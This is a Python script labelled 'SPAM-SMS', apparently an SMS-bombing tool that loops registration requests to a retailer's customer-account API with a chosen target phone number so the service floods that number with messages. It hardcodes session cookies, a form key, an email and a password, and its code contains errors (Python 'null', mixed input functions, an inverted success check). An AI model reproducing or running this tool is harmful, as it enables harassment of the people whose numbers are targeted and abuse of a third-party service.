# coding:utf8
# CODED BY : POKNIK
# GITHUB : https://github.com/Poknikmy
	
import json,sys,time,random,os
from time import sleep
import datetime

try:
   import requests
except ImportError:
   print(' \n\x1b[97m[\x1b[91m!\x1b[97m] Anda Belom Menginstall Module requests')
   print('     \x1b[97mSilahkan Install Dulu Ketik \x1b[91m: \x1b[93mpip2 install requests\n')
   sys.exit()


def spin():
        try:
                L="/-\\|"
                for q in range(75):
                        time.sleep(0.1)
                        sys.stdout.write("\r \x1b[1;97m\x1b[1;91m#\x1b[1;97m \x1b[1;97mStarting [\x1b[1;92m"+L[q % len(L)]+"\x1b[1;97m]")
                        sys.stdout.flush()
        except:
                exit()

class Akugans:

	def __init__(self):
		self.ses = requests.Session()

	def gas(self,____code01____):
		agent = open("agent.txt","r").read()
		acak = random.choice(agent.split("\n"))
		self.head = {
			"Host":"www.matahari.com",
			"content-length":"227",
			"accept":"*/*",
			"x-newrelic-id":"Vg4GVFVXDxAGVVlVBgcGVlY=",
			"x-requested-with":"XMLHttpRequest",
			"sec-ch-ua-mobile":"?1",
                        "user-agent":"Mozilla/5.0 (Linux; Android 10; V2027) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
                        "content-type":"application/json",
                        "origin":"https://www.matahari.com",
                        "sec-fetch-site":"same-origin",
                        "sec-fetch-mode":"cors",
                        "sec-fetch-dest":"empty",
                        "referer":"https://www.matahari.com/customer/account/create/",
                        "accept-encoding":"gzip, deflate, br",
                        "accept-language":"ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7",
                        "cookie":"_ga=GA1.2.2088114915.1618347342",
                        "cookie":"_gid=GA1.2.1629268517.1618347342",
                        "cookie":"_cs_c=1",
                        "cookie":"form_key=LMKOliUXkssqqWsV",
                        "cookie":"mage-cache-storage=%7B%7D",
                        "cookie":"mage-cache-storage-section-invalidation=%7B%7D",
                        "cookie":"recently_viewed_product=%7B%7D",
                        "cookie":"recently_viewed_product_previous=%7B%7D",
                        "cookie":"recently_compared_product=%7B%7D",
                        "cookie":"recently_compared_product_previous=%7B%7D",
                        "cookie":"product_data_storage=%7B%7D",
                        "cookie":"mage-messages=",
                        "cookie":"form_key=LMKOliUXkssqqWsV",
                        "cookie":"_fbp=fb.1.1618347342860.1544472506",
                        "cookie":"PHPSESSID=b67a61d010fb3e00ac3677aed61e90cf",
                        "cookie":"mage-cache-sessid=true",
                        "cookie":"_cs_id=339912c8-fa92-a7f7-8fda-6ec7da4cf403.1618347342.1.1618348715.1618347342.1.1652511342129.Lax.0",
                        "cookie":"_cs_s=8.1",
                        "cookie":"private_content_version=bd3016123bcb33efb38d5f43b895c67a",
                        "cookie":"ins-storage-version=7",
                        "cookie":"section_data_ids=%7B%22customer%22%3A1618348715%7D",}

		self.dat = json.dumps({"thor_customer":{"name":"Poknik","card_number":null,"email_address":"poknkk@gmail.com","mobile_country_code":"+60","gender_id":"1","mobile_number":____code01____,"mro":"3689","password":"poknik09","birth_date":"18/11/2003"}})

		self.Nik = self.ses.post("https://www.matahari.com/rest/V1/thorCustomers",headers=self.head,data=self.dat)
		if "Succses" in self.Nik.text:
			print(" \x1b[91m! \x1b[97mMaaf Error Silahkan Coba Lagi Nanti ")
		else:
			print(" \x1b[92m✓ \x1b[97mSent To \x1b[93m"+ ____code01____ +" \x1b[97m\x1b[101m Subscribe BlackIT \033[0m \x1b[92mSukses")

while True:
	try:
		os.system('clear')
		print("""
	\x1b[93mSPAM-SMS

 \x1b[97m{\x1b[95m*\x1b[97m} Creator \x1b[90m: \x1b[97mPokNik
 \x1b[97m{\x1b[95m*\x1b[97m} Github  \x1b[90m: \x1b[92mhttps://github.com/Poknikmy
\x1b[91m+\x1b[90m----------------------------------------------\x1b[91m+\n""")

		print(" \x1b[93m! \x1b[97mExample \x1b[90m: \x1b[97m01xxxx ")
		_____code01_____ = input(" \x1b[92m• \x1b[97mTarget  \x1b[90m: \x1b[93m")
		____code60____ = int(input(" \x1b[92m• \x1b[97mJumlah  \x1b[90m: \x1b[93m"))
		print('')
		spin()
		print('\n')

		main=Akugans()
		for coli in range(int(____code60____)):
				main.gas(_____code01_____)
		else:
			print("\x1b[91m\x1b[92m\x1b[93m\x1b[95m\033[0m")
		print(" \x1b[97m{\x1b[95m•\x1b[97m} Spam Done Broo...")
		_____exec_____=raw_input(" \x1b[97m{\x1b[95m×\x1b[97m} Back To Spam ? y/n : ")
		if _____exec_____ =='y':
			Akugans()
		elif _____exec_____ =='n':
			print('\n \x1b[97mTHANK YOU SUDAH MENGGUNAKAN TOOLS INI \n')
			sys.exit()
	except Exception as Error:
		sys.exit(Error)

